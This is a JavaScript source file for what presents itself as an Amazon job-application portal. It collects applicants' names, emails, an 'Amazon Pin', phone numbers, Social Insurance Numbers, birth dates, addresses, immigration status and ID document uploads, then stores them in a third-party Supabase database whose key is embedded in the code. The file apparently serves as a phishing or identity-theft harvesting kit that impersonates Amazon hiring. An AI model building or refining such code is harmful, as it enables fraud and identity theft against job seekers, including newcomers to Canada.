/*************************************************
 * Amazon Application Portal – Frontend Logic
 * - Page 2 (info.html): validate + stash to localStorage
 * - Page 3 (submit.html): validate + upload file + insert row
 * - Supabase: applications table + documents (private bucket)
 **************************************************/

/************ CONSTANTS ************/
const REQUIRED_ALERT = 'Please Submit all the documents before submission.'; // exact text
// app.js
const SUPABASE_URL = 'https://dtabrykztmkkabyeljka.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImR0YWJyeWt6dG1ra2FieWVsamthIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjE1MTQ2MjMsImV4cCI6MjA3NzA5MDYyM30.TrqsNYzbPbvVyUg2XS7scoTy9zYSmR7he2Gbi89TC-8';
const STORAGE_BUCKET = 'documents'; // must exist in Supabase Storage (Private)

/************ HELPERS (Page2 → Page3 handoff) ************/
const saveInfo = (obj) => localStorage.setItem('infoForm', JSON.stringify(obj));
const loadInfo = () => {
  try { return JSON.parse(localStorage.getItem('infoForm') || '{}'); }
  catch { return {}; }
};

/************ LOAD SUPABASE SDK + INIT CLIENT ************/
let supabaseClient = null;

function ensureSupabaseLoaded() {
  return new Promise((resolve) => {
    // If already loaded
    if (window.supabase && !supabaseClient) {
      supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
      return resolve(supabaseClient);
    }
    if (window.supabase && supabaseClient) return resolve(supabaseClient);

    // Inject sdk then init
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
    script.onload = () => {
      supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
      resolve(supabaseClient);
    };
    document.head.appendChild(script);
  });
}

/************ PAGE 2: info.html ************/
const infoForm = document.getElementById('infoForm');
if (infoForm) {
  infoForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const fd = new FormData(infoForm);
    const data = Object.fromEntries(fd.entries());

    // Required
    if (!data.name || !data.email || !data.amazon_pin || !data.mobile || !data.employment_type) {
      alert(REQUIRED_ALERT);
      return;
    }
    // You set 6 digits in your file – keeping it 6:
    if (!/^\d{6}$/.test(data.amazon_pin)) {
      alert('Amazon Pin must be 6 digits.');
      return;
    }

    // Stash for page 3
    saveInfo(data);
    window.location.href = 'submit.html';
  });
}

/************ PAGE 3: submit.html ************/
const submitForm = document.getElementById('submitForm');
if (submitForm) {
  submitForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const p2 = loadInfo();
    const fd = new FormData(submitForm);
    const p3 = Object.fromEntries(fd.entries());

    // Validate required fields across both pages
    const requiredP2 = ['name','email','amazon_pin','mobile','employment_type'];
    const requiredP3 = ['address','postal_code','arrived_date','dob','sin','status_in_canada'];

    const missingP2 = requiredP2.some(k => !p2[k]);
    const missingP3 = requiredP3.some(k => !p3[k]);

    if (missingP2 || missingP3) {
      alert(REQUIRED_ALERT);
      return;
    }
    if (!/^\d{9}$/.test(p3.sin)) {
      alert('SIN must be 9 digits.');
      return;
    }

    // Ensure Supabase client is ready
    await ensureSupabaseLoaded();
    if (!supabaseClient) { alert('Supabase not initialized.'); return; }

    /************ Optional file upload ************/
    let document_path = null;
    let document_url = null;

    const fileInput = document.getElementById('document');
    const file = fileInput?.files?.[0] || null;

    if (file) {
      // Basic client-side checks
      const allowed = ['application/pdf','image/jpeg','image/png'];
      const maxBytes = 10 * 1024 * 1024; // 10MB
      if (!allowed.includes(file.type)) {
        alert('Only PDF, JPG, or PNG allowed.');
        return;
      }
      if (file.size > maxBytes) {
        alert('File too large (max 10MB).');
        return;
      }

      // Upload to private bucket
      const safeName = file.name.replace(/[^a-z0-9._-]/gi, '_');
      document_path = `uploads/${Date.now()}_${safeName}`;

      const { error: upErr } = await supabaseClient
        .storage.from(STORAGE_BUCKET)
        .upload(document_path, file, { upsert: false });

      if (upErr) {
        console.error(upErr);
        alert('Upload failed.');
        return;
      }

      // Create a time-limited signed URL (7 days)
      const { data: signed, error: signErr } = await supabaseClient
        .storage.from(STORAGE_BUCKET)
        .createSignedUrl(document_path, 60 * 60 * 24 * 7);

      if (signErr) {
        console.error(signErr);
        alert('Could not create file URL.');
        return;
      }
      document_url = signed?.signedUrl || null;
    }

    /************ Insert row in "applications" ************/
    const payload = {
      // Page 2:
      name: p2.name,
      email: p2.email,
      amazon_pin: p2.amazon_pin,
      mobile: p2.mobile,
      employment_type: p2.employment_type,

      // Page 3:
      sin: p3.sin,
      address: p3.address,
      postal_code: p3.postal_code,
      arrived_date: p3.arrived_date,
      dob: p3.dob,
      status_in_canada: p3.status_in_canada,

      // File:
      document_path,
      document_url
    };

    // NOTE: table name is lowercase "applications"
    const { error: insertErr } = await supabaseClient.from('applications').insert(payload);
    if (insertErr) {
      console.error(insertErr);
      alert('Submission failed.');
      return;
    }

    // Success UI
    const panel = document.getElementById('successPanel');
    if (panel) panel.classList.remove('hidden');
    submitForm.querySelector('button[type="submit"]').disabled = true;
  });
}
